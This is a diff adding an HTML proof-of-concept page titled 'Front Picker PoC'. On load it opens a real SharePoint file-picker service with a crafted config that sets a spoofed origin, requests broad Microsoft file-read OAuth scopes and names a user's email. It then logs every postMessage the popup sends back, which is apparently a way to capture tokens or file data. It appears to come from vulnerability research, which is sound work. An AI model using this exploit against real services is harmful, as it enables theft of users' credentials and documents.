@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Front Picker PoC</title>
+</head>
+<body>
+  <h2>Loading Google ...</h2>
+  <h3>Received postMessage Data:</h3>
+  <pre id="output" style="background:#111;color:#0f0;padding:10px;"></pre>
+
+  <script>
+    window.onload = function() {
+      window.open(
+        "https://sharepoint-picker.frontapplication.com/sharepoint/index.html?config=%7B%22microsoftClientId%22%3A%22c9d363c6-6f98-45d0-9c0d-e754c264c496%22%2C%22microsoftOAuthScopes%22%3A%22User.Read%2CFiles.Read.All%2CSites.Read.All%22%2C%22origin%22%3A%22https%3A%2F%2Fgithub.io%22%2C%22allowedExtensions%22%3A%5B%22folder%22%2C%22.doc%22%2C%22.docx%22%5D%2C%22authenticatedUserEmail%22%3A%22hrtz52.h1%40gmail.com%22%7D",
+        "pickerPopup",
+        "width=600,height=600"
+      );
+    };
+
+    window.addEventListener("message", function(event) {
+      document.getElementById("output").textContent =
+        "Message received!\n\nOrigin: " + event.origin + "\n\nData:\n" +
+        JSON.stringify(event.data, null, 2);
+    });
+  </script>
+</body>
+
+</html>
